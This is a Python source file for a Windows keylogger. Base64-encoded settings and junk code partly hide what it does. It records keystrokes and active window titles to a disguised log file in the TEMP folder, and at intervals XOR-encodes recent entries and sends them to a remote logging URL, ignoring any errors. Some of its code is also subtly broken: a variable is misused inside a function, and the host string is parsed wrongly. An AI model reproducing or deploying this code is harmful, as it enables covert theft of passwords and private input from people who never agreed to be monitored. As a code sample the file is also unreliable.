import ctypes
import os
import sys
import threading
import time
import base64
import socket
import random

# Decode configuration strings
cfg1 = base64.b64decode('aHR0cDovL2V4YW1wbGUuY29tL2xvZ2dlcg==').decode('utf-8')
cfg2 = base64.b64decode('S2V5TG9nZ2VyU2Vzc2lvbg==').decode('utf-8')
cfg3 = base64.b64decode('dXNlci1hZ2VudA==').decode('utf-8')

# Junk variables
temp_var_alpha = 12345
unused_list = [x for x in range(100) if x % 2 == 0]
random_name = "placeholder"
data_buffer = []

# XOR cipher function
def xor_cipher(data, key=0x42):
    return bytes([b ^ key for b in data])

# Network transmission with XOR
def send_encrypted_log(data):
    try:
        host_port = (cfg1.split(':')[1][2:], 80)
        sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_obj.settimeout(5)
        sock_obj.connect(host_port)
        encrypted = xor_cipher(data.encode())
        header = f"POST /log HTTP/1.1\r\nHost: {host_port[0]}\r\nUser-Agent: {cfg3}\r\nContent-Length: {len(encrypted)}\r\n\r\n"
        sock_obj.send(header.encode() + encrypted)
        sock_obj.close()
    except Exception as e:
        pass  # Silent fail

# Key logging function
def start_keylogger():
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    current_window = None
    log_file = os.path.join(os.getenv('TEMP'), 'system_log.txt')
    
    def get_foreground_window_title():
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value

    # Junk loop
    for _ in range(10):
        temp_var_alpha += random.randint(1, 10)
    
    with open(log_file, 'a', encoding='utf-8') as f:
        while True:
            time.sleep(0.1)
            window_title = get_foreground_window_title()
            if window_title != current_window:
                current_window = window_title
                f.write(f"\n[{cfg2}] Window: {window_title}\n")
                f.flush()
            
            for key_code in range(8, 256):
                if user32.GetAsyncKeyState(key_code) & 0x8000:
                    key_name = str(key_code)
                    if 0x41 <= key_code <= 0x5A:
                        shift_state = user32.GetAsyncKeyState(0x10)
                        key_name = chr(key_code) if shift_state else chr(key_code + 32)
                    f.write(key_name + ' ')
                    f.flush()
                    
                    # Periodically send logs
                    if random.randint(1, 100) > 95:
                        with open(log_file, 'r', encoding='utf-8') as log_read:
                            recent_data = log_read.read()[-500:]
                        threading.Thread(target=send_encrypted_log, args=(recent_data,)).start()

# Main entry point
if __name__ == "__main__":
    if sys.platform != 'win32':
        sys.exit()
    # Start in separate thread
    thread = threading.Thread(target=start_keylogger)
    thread.daemon = True
    thread.start()
    # Keep alive
    while True:
        time.sleep(60)